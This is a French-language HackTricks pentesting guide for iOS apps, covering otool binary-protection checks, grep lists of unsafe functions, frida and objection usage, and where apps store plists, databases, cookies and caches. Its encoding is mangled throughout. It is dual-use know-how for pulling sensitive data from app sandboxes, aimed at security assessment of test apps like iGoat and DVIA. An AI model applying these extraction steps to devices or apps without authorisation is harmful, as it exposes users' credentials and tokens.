# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Fondamentaux d'iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Environnement de test

Sur cette page, vous trouverez des informations sur le **simulateur iOS**, les **√©mulateurs** et le **jailbreak** :

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Analyse initiale

### Op√©rations de test de base d'iOS

Pendant le test, **plusieurs op√©rations seront sugg√©r√©es** (connexion √† l'appareil, lecture/√©criture/t√©l√©chargement de fichiers, utilisation d'outils...). Par cons√©quent, si vous ne savez pas comment effectuer l'une de ces actions, **commencez par lire la page** :

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Pour les √©tapes suivantes, **l'application doit √™tre install√©e** sur l'appareil et vous devez d√©j√† avoir obtenu le **fichier IPA** de l'application.\
Lisez la page [Op√©rations de test de base d'iOS](basic-ios-testing-operations.md) pour apprendre comment faire cela.
{% endhint %}

### Analyse statique de base

Il est recommand√© d'utiliser l'outil [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) pour effectuer une analyse statique automatique du fichier IPA.

Identification des **protections pr√©sentes dans le binaire** :

*   **PIE (Position Independent Executable)** : Lorsqu'il est activ√©, l'application se charge √† une adresse m√©moire al√©atoire √† chaque d√©marrage, ce qui rend plus difficile de pr√©dire son adresse m√©moire initiale.

```bash
otool -hv <app-binary> | grep PIE   # Il devrait inclure le drapeau PIE
```
*   **Canaris de pile** : Pour valider l'int√©grit√© de la pile, une valeur de "canari" est plac√©e sur la pile avant d'appeler une fonction et est valid√©e √† nouveau une fois que la fonction se termine.

```bash
otool -I -v <app-binary> | grep stack_chk   # Il devrait inclure les symboles : stack_chk_guard et stack_chk_fail
```
*   **ARC (Automatic Reference Counting)** : Pour pr√©venir les erreurs courantes de corruption de m√©moire

```bash
otool -I -v <app-binary> | grep objc_release   # Il devrait inclure le symbole _objc_release
```
*   **Binaire chiffr√©** : Le binaire doit √™tre chiffr√©

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # Le cryptid devrait √™tre 1
```

**Identification des fonctions sensibles/in-s√©curis√©es**

*   **Algorithmes de hachage faibles**

```bash
# Sur l'appareil iOS
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Sur Linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **Fonctions de g√©n√©ration de nombres al√©atoires non s√©curis√©es**

```bash
# Sur l'appareil iOS
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Sur Linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **Fonction 'Malloc' non s√©curis√©e**

```bash
# Sur l'appareil iOS
otool -Iv <app> | grep -w "_malloc"

# Sur Linux
grep -iER "_malloc"
```
*   **Fonctions non s√©curis√©es et vuln√©rables**

```bash
# Sur l'appareil iOS
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Sur Linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```
### Analyse dynamique de base

Consultez l'analyse dynamique effectu√©e par [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF). Vous devrez naviguer √† travers les diff√©rentes vues et interagir avec elles, mais cela va accrocher plusieurs classes et effectuer d'autres actions, puis pr√©parer un rapport une fois que vous avez termin√©.

### Liste des applications install√©es

Lorsque vous ciblez des applications install√©es sur l'appareil, vous devez d'abord trouver l'identifiant de bundle correct de l'application que vous souhaitez analyser. Vous pouvez utiliser `frida-ps -Uai` pour obtenir toutes les applications (`-a`) actuellement install√©es (`-i`) sur l'appareil USB connect√© (`-U`):
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### √ânum√©ration de base et Hooking

Apprenez comment **√©num√©rer les composants de l'application** et comment **facilement hooker les m√©thodes et les classes** avec objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Structure IPA

Les fichiers `.ipa` sont des **paquets zipp√©s**, vous pouvez donc changer l'extension en `.zip` et les **d√©compresser**. Une application **compl√®te** pr√™te √† √™tre install√©e est commun√©ment appel√©e un **Bundle**.\
Apr√®s les avoir d√©compress√©s, vous devriez voir `<NOM>.app`, une archive zipp√©e qui contient le reste des ressources.

* `Info.plist`: Un fichier qui contient certaines des configurations sp√©cifiques de l'application.
* `_CodeSignature/` contient un fichier plist avec une signature sur tous les fichiers du bundle.
* `Assets.car`: Une autre archive zipp√©e qui contient des ressources (ic√¥nes).
* `Frameworks/` contient les biblioth√®ques natives de l'application sous forme de fichiers .dylib ou .framework.
* `PlugIns/` peut contenir des extensions d'application sous forme de fichiers .appex (absents dans l'exemple).
* [`Core Data`](https://developer.apple.com/documentation/coredata): Il est utilis√© pour enregistrer les donn√©es permanentes de votre application pour une utilisation hors ligne, pour mettre en cache les donn√©es temporaires et pour ajouter des fonctionnalit√©s d'annulation √† votre application sur un seul appareil. Pour synchroniser les donn√©es sur plusieurs appareils dans un seul compte iCloud, Core Data refl√®te automatiquement votre sch√©ma dans un conteneur CloudKit.
* [`PkgInfo`](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Le fichier `PkgInfo` est une autre fa√ßon de sp√©cifier le type et les codes de cr√©ateur de votre application ou bundle.
* **en.lproj, fr.proj, Base.lproj**: Ce sont les packs de langues qui contiennent des ressources pour ces langues sp√©cifiques, ainsi qu'une ressource par d√©faut au cas o√π une langue n'est pas prise en charge.

Il existe plusieurs fa√ßons de d√©finir l'interface utilisateur dans une application iOS: les fichiers _storyboard_, _nib_ ou _xib_.

**Info.plist**

La liste de propri√©t√©s d'informations ou `Info.plist` est la principale source d'informations pour une application iOS. Il s'agit d'un fichier structur√© contenant des paires **cl√©-valeur** d√©crivant des informations de configuration essentielles sur l'application. En fait, tous les ex√©cutables inclus (extensions d'application, frameworks et applications) sont **cens√©s avoir** un fichier `Info.plist`. Vous pouvez trouver toutes les cl√©s possibles dans la [**documentation du d√©veloppeur Apple**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc).

Le fichier peut √™tre format√© en **XML ou en binaire (bplist)**. Vous pouvez le **convertir en format XML** avec une seule commande :

*   Sur macOS avec `plutil`, qui est un outil natif de macOS 10.2 et des versions sup√©rieures (aucune documentation en ligne officielle n'est actuellement disponible) :

```bash
$ plutil -convert xml1 Info.plist
```
*   Sur Linux :

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```

Voici une liste non exhaustive de certaines informations et des mots-cl√©s correspondants que vous pouvez facilement rechercher dans le fichier `Info.plist` en inspectant simplement le fichier ou en utilisant `grep -i <mot-cl√©> Info.plist` :

* Cha√Ænes de but des autorisations de l'application : `UsageDescription`
* Schemes d'URL personnalis√©s : `CFBundleURLTypes`
* Types de documents personnalis√©s export√©s/import√©s : `UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`
* Configuration de la s√©curit√© du transport de l'application (ATS) : `NSAppTransportSecurity`

Veuillez vous r√©f√©rer aux chapitres mentionn√©s pour en savoir plus sur la fa√ßon de tester chacun de ces points.

**Chemins des donn√©es**

Sur iOS, les applications **syst√®me peuvent √™tre trouv√©es dans le r√©pertoire `/Applications`** tandis que les applications **install√©es par l'utilisateur** sont disponibles sous **`/private/var/containers/`**. Cependant, trouver le bon dossier simplement en naviguant dans le syst√®me de fichiers n'est pas une t√¢che facile car **chaque application re√ßoit un UUID (Universal Unique Identifier) de 128 bits al√©atoire** attribu√© √† ses noms de r√©pertoire.

Pour obtenir facilement les informations sur le r√©pertoire d'installation des applications install√©es par l'utilisateur, vous pouvez utiliser la commande **`env`** d'objection qui vous montrera √©galement toutes les informations sur les r√©pertoires de l'application :
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Vous pouvez √©galement rechercher le nom de l'application dans **`/private/var/containers`** :
```bash
find /private/var/containers -name "Progname*"
```
Ou en utilisant **`ps`** et **`lsof`** :
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
Comme vous pouvez le voir, les applications ont deux emplacements principaux :

* Le **r√©pertoire Bundle** (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/`).
* Le **r√©pertoire Data** (`/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/`).

Ces dossiers contiennent des informations qui doivent √™tre examin√©es de pr√®s lors des √©valuations de s√©curit√© des applications (par exemple, lors de l'analyse des donn√©es stock√©es pour des donn√©es sensibles).

**R√©pertoire Bundle :**

* **AppName.app**
* Il s'agit du Bundle de l'application tel qu'il appara√Æt dans l'IPA, il contient les donn√©es essentielles de l'application, le contenu statique ainsi que le binaire compil√© de l'application.
* Ce r√©pertoire est visible par les utilisateurs, mais **les utilisateurs ne peuvent pas y √©crire**.
* Le contenu de ce r√©pertoire n'est **pas sauvegard√©**.
* Le contenu de ce dossier est utilis√© pour **valider la signature du code**.

**R√©pertoire Data :**

* **Documents/**
* Contient toutes les donn√©es g√©n√©r√©es par l'utilisateur. L'utilisateur final de l'application initie la cr√©ation de ces donn√©es.
* Visible par les utilisateurs et **les utilisateurs peuvent y √©crire**.
* Le contenu de ce r√©pertoire est **sauvegard√©**.
* L'application peut d√©sactiver les chemins en d√©finissant `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Contient tous les **fichiers qui ne sont pas sp√©cifiques √† l'utilisateur**, tels que les **caches**, les **pr√©f√©rences**, les **cookies** et les fichiers de configuration de la liste de propri√©t√©s (plist).
* Les applications iOS utilisent g√©n√©ralement les sous-r√©pertoires `Application Support` et `Caches`, mais l'application peut cr√©er des sous-r√©pertoires personnalis√©s.
* **Library/Caches/**
* Contient des fichiers **mis en cache semi-persistants**.
* Invisible pour les utilisateurs et **les utilisateurs ne peuvent pas y √©crire**.
* Le contenu de ce r√©pertoire n'est **pas sauvegard√©**.
* Le syst√®me d'exploitation peut supprimer automatiquement les fichiers de ce r√©pertoire lorsque l'application ne s'ex√©cute pas et que l'espace de stockage est limit√©.
* **Library/Application Support/**
* Contient des **fichiers persistants** n√©cessaires √† l'ex√©cution de l'application.
* **Invisible** pour les utilisateurs et les utilisateurs ne peuvent pas y √©crire.
* Le contenu de ce r√©pertoire est **sauvegard√©**.
* L'application peut d√©sactiver les chemins en d√©finissant `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Utilis√© pour stocker des propri√©t√©s qui peuvent **persister m√™me apr√®s le red√©marrage d'une application**.
* Les informations sont enregistr√©es, non chiffr√©es, √† l'int√©rieur du bac √† sable de l'application dans un fichier plist appel√© \[BUNDLE\_ID].plist.
* Toutes les paires cl√©/valeur stock√©es √† l'aide de `NSUserDefaults` peuvent √™tre trouv√©es dans ce fichier.
* **tmp/**
* Utilisez ce r√©pertoire pour √©crire des **fichiers temporaires** qui n'ont pas besoin de persister entre les lancements de l'application.
* Contient des fichiers mis en cache non persistants.
* **Invisible** pour les utilisateurs.
* Le contenu de ce r√©pertoire n'est pas sauvegard√©.
* Le syst√®me d'exploitation peut supprimer automatiquement les fichiers de ce r√©pertoire lorsque l'application ne s'ex√©cute pas et que l'espace de stockage est limit√©.

Jetons un coup d'≈ìil plus attentif au r√©pertoire Bundle de l'application iGoat-Swift (.app) √† l'int√©rieur du r√©pertoire Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`) :
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### R√©tro-ing√©nierie binaire

√Ä l'int√©rieur du dossier `<nom-de-l'application>.app`, vous trouverez un fichier binaire appel√© `<nom-de-l'application>`. C'est le fichier qui sera **ex√©cut√©**. Vous pouvez effectuer une inspection de base du binaire avec l'outil **`otool`** :
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**V√©rifier si l'application est chiffr√©e**

V√©rifiez s'il y a une sortie pour:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**D√©sassemblage du binaire**

D√©sassemblez la section de texte :
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Pour afficher le segment **Objective-C** de l'application d'exemple, on peut utiliser :
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Afin d'obtenir un code Objective-C plus compact, vous pouvez utiliser [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Cependant, les meilleures options pour d√©sassembler le binaire sont: [**Hopper**](https://www.hopperapp.com/download.html?) et [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er facilement et **automatiser des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Stockage des donn√©es

Pour en savoir plus sur la fa√ßon dont iOS stocke les donn√©es dans l'appareil, lisez cette page:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Les emplacements suivants pour stocker des informations doivent √™tre v√©rifi√©s **juste apr√®s l'installation de l'application**, **apr√®s avoir v√©rifi√© toutes les fonctionnalit√©s** de l'application et m√™me apr√®s **s'√™tre d√©connect√© d'un utilisateur et s'√™tre connect√© √† un autre**.\
L'objectif est de trouver des **informations sensibles non prot√©g√©es** de l'application (mots de passe, jetons), de l'utilisateur actuel et des utilisateurs pr√©c√©demment connect√©s.
{% endhint %}

### Plist

Les fichiers **plist** sont des fichiers XML structur√©s qui **contiennent des paires cl√©-valeur**. C'est une fa√ßon de stocker des donn√©es persistantes, donc parfois vous pouvez trouver **des informations sensibles dans ces fichiers**. Il est recommand√© de v√©rifier ces fichiers apr√®s l'installation de l'application et apr√®s l'avoir utilis√©e intensivement pour voir si de nouvelles donn√©es sont √©crites.

La fa√ßon la plus courante de persister les donn√©es dans les fichiers plist est d'utiliser **NSUserDefaults**. Ce fichier plist est enregistr√© √† l'int√©rieur du bac √† sable de l'application dans **`Library/Preferences/<appBundleID>.plist`**

La classe [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) fournit une interface programmatique pour interagir avec le syst√®me par d√©faut. Le syst√®me par d√©faut permet √† une application de personnaliser son comportement en fonction des **pr√©f√©rences de l'utilisateur**. Les donn√©es enregistr√©es par `NSUserDefaults` peuvent √™tre consult√©es dans le bundle de l'application. Cette classe stocke les **donn√©es** dans un **fichier plist**, mais elle est destin√©e √† √™tre utilis√©e avec de petites quantit√©s de donn√©es.

Ces donn√©es ne peuvent plus √™tre directement accessibles via un ordinateur de confiance, mais elles peuvent √™tre accessibles en effectuant une **sauvegarde**.

Vous pouvez **extraire** les informations enregistr√©es en utilisant **`NSUserDefaults`** en utilisant la commande `ios nsuserdefaults get` d'objection.

Pour trouver tous les fichiers plist utilis√©s par l'application, vous pouvez acc√©der √† `/private/var/mobile/Containers/Data/Application/{APPID}` et ex√©cuter:
```bash
find ./ -name "*.plist"
```
Le fichier peut √™tre format√© en **XML ou en binaire (bplist)**. Vous pouvez **le convertir en format XML** avec une simple commande :

*   Sur macOS avec `plutil`, qui est un outil natif de macOS 10.2 et des versions sup√©rieures (aucune documentation en ligne officielle n'est actuellement disponible) :

```bash
$ plutil -convert xml1 Info.plist
```
*   Sur Linux :

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
*   Sur une session objection :

```bash
ios plist cat /private/var/mobile/Containers/Data/Application/AF1F534B-1B8F-0825-ACB21-C0301AB7E56D/Library/Preferences/com.some.package.app.plist
```

### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) est un framework pour g√©rer la couche mod√®le des objets dans votre application. [Core Data peut utiliser SQLite comme son magasin persistant](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), mais le framework lui-m√™me n'est pas une base de donn√©es.\
CoreData n'encrypte pas ses donn√©es par d√©faut. Cependant, une couche de chiffrement suppl√©mentaire peut √™tre ajout√©e √† CoreData. Consultez le [repo GitHub](https://github.com/project-imas/encrypted-core-data) pour plus de d√©tails.

Vous pouvez trouver les informations SQLite Core Data d'une application dans le chemin `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Si vous pouvez ouvrir le SQLite et acc√©der √† des informations sensibles, alors vous avez trouv√© une mauvaise configuration.**

{% code title="Code from iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) est un magasin cl√©/valeur construit sur SQLite.\
Comme les bases de donn√©es Yap sont des bases de donn√©es SQLite, vous pouvez les trouver en utilisant la commande propos√©e dans la section pr√©c√©dente.

### Autres bases de donn√©es SQLite

Il est courant que les applications cr√©ent leur propre base de donn√©es SQLite. Elles peuvent y **stocker** des **donn√©es sensibles** et les laisser non chiffr√©es. Il est donc toujours int√©ressant de v√©rifier chaque base de donn√©es dans le r√©pertoire des applications. Allez donc dans le r√©pertoire de l'application o√π les donn√©es sont enregistr√©es (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Bases de donn√©es en temps r√©el Firebase

Elles peuvent √™tre utilis√©es par les d√©veloppeurs d'applications pour **stocker et synchroniser des donn√©es avec une base de donn√©es NoSQL h√©berg√©e dans le cloud**. Les donn√©es sont stock√©es au format JSON et sont synchronis√©es en temps r√©el avec chaque client connect√©, et elles restent √©galement disponibles m√™me lorsque l'application est hors ligne.

Vous pouvez trouver comment v√©rifier les bases de donn√©es Firebase mal configur√©es ici:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Bases de donn√©es Realm

[Realm Objective-C](https://realm.io/docs/objc/latest/) et [Realm Swift](https://realm.io/docs/swift/latest/) ne sont pas fournies par Apple, mais elles m√©ritent d'√™tre mentionn√©es. Elles **stockent tout en clair, sauf si la configuration a activ√© le chiffrement**.

Vous pouvez trouver ces bases de donn√©es dans `/private/var/mobile/Containers/Data/Application/{APPID}`.
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Vous pouvez utiliser l'outil [**Realm Studio**](https://github.com/realm/realm-studio) pour ouvrir ces fichiers de base de donn√©es.

L'exemple suivant d√©montre comment utiliser le chiffrement avec une base de donn√©es Realm :
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Bases de donn√©es Couchbase Lite

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) est un moteur de base de donn√©es l√©ger, int√©gr√© et orient√© documents (NoSQL) qui peut √™tre synchronis√©. Il est compil√© nativement pour iOS et macOS.

V√©rifiez la pr√©sence √©ventuelle de bases de donn√©es Couchbase dans `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/`

### Cookies

iOS stocke les cookies des applications dans le fichier **`Library/Cookies/cookies.binarycookies`** √† l'int√©rieur du dossier de chaque application. Cependant, les d√©veloppeurs d√©cident parfois de les enregistrer dans le **trousseau** car le fichier de cookies mentionn√© peut √™tre accessible dans les sauvegardes.

Pour inspecter le fichier de cookies, vous pouvez utiliser [**ce script python**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) ou utiliser la commande **`ios cookies get`** d'objection.\
**Vous pouvez √©galement utiliser objection pour** convertir ces fichiers au format JSON et inspecter les donn√©es.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

Par d√©faut, NSURLSession stocke les donn√©es telles que les requ√™tes et les r√©ponses HTTP dans la base de donn√©es Cache.db. Cette base de donn√©es peut contenir des donn√©es sensibles si des jetons, des noms d'utilisateur ou toute autre information sensible a √©t√© mise en cache. Pour trouver les informations mises en cache, ouvrez le r√©pertoire de donn√©es de l'application (`/var/mobile/Containers/Data/Application/<UUID>`) et acc√©dez √† `/Library/Caches/<Bundle Identifier>`. Le cache WebKit est √©galement stock√© dans le fichier Cache.db. Objection peut ouvrir et interagir avec la base de donn√©es avec la commande `sqlite connect Cache.db`, car il s'agit d'une base de donn√©es SQLite normale.

Il est recommand√© de d√©sactiver la mise en cache de ces donn√©es, car elles peuvent contenir des informations sensibles dans la requ√™te ou la r√©ponse. La liste suivante montre diff√©rentes fa√ßons d'y parvenir :

1. Il est recommand√© de supprimer les r√©ponses mises en cache apr√®s la d√©connexion. Cela peut √™tre fait avec la m√©thode fournie par Apple appel√©e [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). Vous pouvez appeler cette m√©thode comme suit :

`URLCache.shared.removeAllCachedResponses()`

Cette m√©thode supprimera toutes les requ√™tes et r√©ponses mises en cache du fichier Cache.db.
2. Si vous n'avez pas besoin d'utiliser les cookies, il est recommand√© d'utiliser simplement la propri√©t√© [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) de URLSession, qui d√©sactivera l'enregistrement des cookies et des caches.

[Documentation Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) :

`Un objet de configuration de session √©ph√©m√®re est similaire √† un objet de configuration de session par d√©faut (voir default), √† l'exception que l'objet de session correspondant ne stocke pas de caches, de magasins d'informations d'identification ou de donn√©es li√©es √† la session sur le disque. Au lieu de cela, les donn√©es li√©es √† la session sont stock√©es en RAM. La seule fois o√π une session √©ph√©m√®re √©crit des donn√©es sur le disque, c'est lorsque vous lui demandez d'√©crire le contenu d'une URL dans un fichier.`
3. Le cache peut √©galement √™tre d√©sactiv√© en d√©finissant la politique de cache sur [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Cela d√©sactivera le stockage du cache de quelque mani√®re que ce soit, que ce soit en m√©moire ou sur disque.

### Snapshots

Chaque fois que vous appuyez sur le bouton d'accueil, iOS prend une capture d'√©cran de l'√©cran actuel afin de pouvoir effectuer la transition vers l'application de mani√®re plus fluide. Cependant, si des donn√©es sensibles sont pr√©sentes √† l'√©cran, elles seront enregistr√©es dans l'image (qui persiste m√™me apr√®s le red√©marrage). Ce sont les captures d'√©cran auxquelles vous pouvez √©galement acc√©der en double-cliquant sur l'√©cran d'accueil pour basculer entre les applications.

